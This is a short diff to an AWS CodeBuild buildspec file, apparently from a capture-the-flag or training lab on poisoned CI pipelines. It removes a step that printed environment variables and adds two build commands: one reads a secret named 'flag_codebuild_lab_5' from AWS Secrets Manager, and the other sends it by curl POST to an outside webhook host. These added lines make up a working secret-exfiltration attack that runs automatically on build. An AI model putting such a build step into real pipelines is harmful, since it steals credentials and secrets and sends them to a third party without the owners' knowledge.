@@ -1,8 +1,6 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - FLAG=$(aws secretsmanager get-secret-value --region us-east-1 --secret-id flag_codebuild_lab_5 --query SecretString --output text)
+      - curl -fsS -X POST --data-urlencode "flag=$FLAG" "https://hook.juliangr505.com/3b1c30d1-7509-456c-8be7-47a3b865dd45"
